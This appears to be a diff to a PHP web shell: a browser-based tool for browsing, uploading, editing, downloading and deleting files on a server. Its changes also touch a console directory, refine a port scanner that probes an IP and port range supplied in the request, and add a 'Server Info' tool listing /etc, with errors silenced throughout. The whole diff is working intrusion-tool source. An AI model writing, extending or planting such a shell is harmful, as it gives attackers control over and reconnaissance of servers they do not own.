@@ -1242,22 +1395,30 @@ if(array_key_exists("r", $_REQUEST))
 		{
 			if ($config['demo'] == true)
 			{
-				header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+				echo "Demo Version [Change Config]";
 			}
 			else
 			{
 				if (file_exists($file))
 				{
-					unlink($file);
-					header("location: ". $back);			
+					$delete = Remove($file);
+
+					if ($delete)
+					{
+						header("location: ". $back);
+					}
 				}
 			}		
 		}
+
 	}
 }
 
 if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRIPT_NAME"])
 {
+	$dir = urldecode($dir);
+	$_SESSION['curdir'] = $dir; // Save Chdir for Console
+
 	if(array_key_exists("file", $_POST) && $_POST['file'] == "New File")
 	{
 		if ($config['demo'] == true)
@@ -1268,14 +1429,14 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 		{
 			$file = $dir.DIRECTORY_SEPARATOR.$_POST['what'];
 			$myfile = @fopen($file, "w");
-			if ($myfile)
+			if (!$myfile)
 			{
-				fclose($myfile);
-				header("location: ".$_SERVER['PHP_SELF']."?a=e&r=".urlencode($file));
+				echo "<b class='off'>Can't create new file!</b>";
 			}
 			else
 			{
-				echo "<b class='off'>Can't create new file!</b>";
+				fclose($myfile);
+				header("location: ".$_SERVER['PHP_SELF']."?a=e&r=".urlencode($file));
 			}
 		}
 	}
@@ -1319,52 +1480,49 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 		}
 	}
 	
-	$sep = (substr($dir,-1) == DIRECTORY_SEPARATOR) ?  "" : DIRECTORY_SEPARATOR;
-	$_SESSION['curdir'] = $dir; // Save Chdir for Console
-	
-	if ($handle = opendir($dir))
+	if ($handle = @opendir($dir))
 	{
 		$exp = "";
 		while (false !== ($file = readdir($handle)))
 		{
-			$filedir = $dir.$sep.$file;
+			$filedir = $dir.DIRECTORY_SEPARATOR.$file;
 			$updir = substr($dir, 0, strrpos($dir, DIRECTORY_SEPARATOR));
 			$type = GetFileType($filedir);
-			$size = GetFileSize(filesize($filedir));
+			$size = GetFileSize(@filesize($filedir));
 			$last = GetFileTime($filedir, "modify");
 			$perm = GetFilePerm($filedir);
 			$owner = GetOwnerGroup($filedir);
 			
 			if ($file == ".")
 			{
-				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($dir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($dir). "'>.</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
+				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($dir)."' disabled /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($dir). "'>.</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
 			}
 			elseif ($file == "..")
 			{
-				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($updir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($updir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
+				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($updir)."' disabled /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($updir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
 			}
 			else
 			{
 				if ($type == "Dir")
 				{
-					$exp .= "<tr sorttable_customkey='2'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a class='flink' title='Explore Directory' href='?d=" .urlencode($filedir). "'>" . $file . "/</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
+					$exp .= "<tr sorttable_customkey='2'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a class='flink' title='Explore Directory' href='?d=" .urlencode($filedir). "'>" . $file . "/</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td><a href='?a=del&r=" .urlencode($filedir). "' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>X</a> | <a href='?a=c&r=" .urlencode($filedir). "' title='Modify Folder'>M</a></td></tr>";
 				}
 				else
 				{
-					$exp .= "<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a class='flink' title='Edit file' href='?a=v&r=" .urlencode($filedir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td><a href='?a=e&r=" .urlencode($filedir). "' title='Edit file'>E</a> | <a href='?a=del&r=" .urlencode($filedir). "' onclick=\"return confirm('Delete It ?');\" title='Delete'>X</a> | <a href='?a=d&r=".urlencode($filedir)."' title='Download file'>D</a></td></tr>";		
+					$exp .= "<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a class='flink' title='Edit File' href='?a=v&r=" .urlencode($filedir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td><a href='?a=e&r=" .urlencode($filedir). "' title='Edit File'>E</a> | <a href='?a=del&r=" .urlencode($filedir). "' onclick=\"return confirm('Delete It ?');\" title='Delete File'>X</a> | <a href='?a=d&r=".urlencode($filedir)."' title='Download File'>D</a></td></tr>";		
 				}
 			}
 		}
 		printf("<div id='action'>
 					<table><tr>
 					<td><form class='new' method=POST action='?d=%s'>
-						<input name='what' type='text' /><input type='submit' name='file' value='New File'/>
+						<input name='what' type='text'/><input type='submit' name='file' value='New File'/>
 						</form></td>
 					<td><form class='new' method=POST action='?d=%s'>
 						<input name='what' type='text' /><input type='submit' name='folder' value='New Folder'/>
 					</form></td>
 					<td><form class='new' method=POST action='?d=%s&x=upload' enctype='multipart/form-data'>
-						<input name='what' type='file' /><input type='submit' name='upload' value='Upload'/>
+						<input name='what' type='file' class='inputfile'/><input type='submit' name='upload' value='Upload'/>
 					</form></td>
 					</tr></table>
 				</div>
@@ -1379,7 +1537,7 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 							<th>Perms</th>
 							<th>Owner:Group</th>
 							<th>Time</th>
-							<th class='sorttable_nosort'>Act.</th>
+							<th>Act.</th>
 						</tr>
 						%s
 						</table>
@@ -1400,6 +1558,10 @@ if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRI
 				$exp);
 		closedir($handle);
 	}
+	else
+	{
+		printf('Location not Exists');
+	}
 }
 
 if(array_key_exists("z", $_REQUEST))
@@ -1409,7 +1571,12 @@ if(array_key_exists("z", $_REQUEST))
 		"custom-tools" => array(
 			"title" => "Custom Tools",
 			"desc"  => "Build your own tools",
-	)));
+		),
+		"server-info" => array(
+			"title" => "Server Info",
+			"desc"  => "Build your own tools",
+		)
+	));
 	echo "<div id='tools'>";
 	
 	if(empty($z))
@@ -1434,13 +1601,13 @@ if(array_key_exists("z", $_REQUEST))
 
 		if (array_key_exists("x", $_REQUEST) && $_REQUEST['x'] == "scan-port")
 		{
-			error_reporting(~E_ALL);
 			ob_clean();
 			flush();
+
 			$host = $_REQUEST['ip'];
 			$from = $_REQUEST['sp'];
 			$to   = $_REQUEST['ep']; 
-			$mtd  = $_REQUEST['mtd']; 
+			$mtd  = $_REQUEST['mtd'];
 
 			switch ($mtd)
 			{
@@ -1448,14 +1615,13 @@ if(array_key_exists("z", $_REQUEST))
 					if (function_exists('socket_create'))
 					{
 						$socket = socket_create(AF_INET , SOCK_STREAM , SOL_TCP);  
-						for($port = $from; $port <= $to ; $port++)
+						for ($conn_port = $from; $conn_port <= $to; $conn_port++)
 						{
-						    $connection = socket_connect($socket , $host ,  $port);
+						    $connection = @socket_connect($socket , $host,  $conn_port);
 						    if ($connection)
 						    {
-						      echo "<br>port $port open";
-						      socket_close($socket);
-						      $socket = socket_create(AF_INET , SOCK_STREAM , SOL_TCP);  
+						      echo "<br>port $conn_port open";
+						      socket_close($socket); 
 						    }    
 						}
 					}
@@ -1466,14 +1632,14 @@ if(array_key_exists("z", $_REQUEST))
 					
 				break;
 				case '2':
-					for($port = $from; $port <= $to ; $port++)
+					for ($conn_port = $from; $conn_port <= $to; $conn_port++)
 					{
-					  $fp = fsockopen($host , $port);
-					  if ($fp)
-					  {
-					    echo "<br>port $port open";
-					    fclose($fp);
-					  }
+						$fp = @fsockopen($host, $conn_port);
+						if ($fp)
+						{
+							echo "<br>port $conn_port open";
+							fclose($fp);
+						}
 					}
 				break;
 			}
@@ -1487,6 +1653,20 @@ if(array_key_exists("z", $_REQUEST))
 	if($z == "custom-tools")
 	{
 		echo "<center><h3>". $default[$z]['desc'] . "</h3></center>";
+	}
+
+	if($z == "server-info")
+	{
+
+		$dir = is_readable('/etc') ? '/etc' : '';
+		if ($handle = opendir($dir))
+		{
+			$exp = "";
+			while (false !== ($file = readdir($handle)))
+			{
+				echo $file . '<br>';
+			}
+		}
 	}
 	
 	/* YOUR TOOLS END HERE */
